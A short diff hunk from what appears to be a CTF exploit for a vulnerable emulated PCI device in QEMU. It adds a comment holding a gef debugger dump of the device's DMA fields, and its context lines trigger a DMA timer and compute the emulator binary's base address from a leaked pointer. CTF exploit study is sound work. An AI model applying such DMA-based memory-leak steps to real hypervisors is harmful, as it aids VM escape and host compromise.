@@ -157,6 +157,16 @@ int main(int argc, char *argv[])
 	//set dma.cmd and trigger timer_func
 	pcimem_write(0x98, 'd', (uint64_t)(1 | 2));
 	sleep(1);
+	/*
+	gef➤  p (*(HitbState*)0x555557f83e30).dma
+	$3 = {
+ 	src = 0x41000, 
+  	dst = 0x340a000, 
+  	cnt = 0x8, 
+  	cmd = 0x3
+	}
+
+	*/
 
 	uint64_t bin_addr = *(uint64_t *)dma_addr - 0x283DD0;
 	printf("[+] binary @ 0x%lX\n", bin_addr);
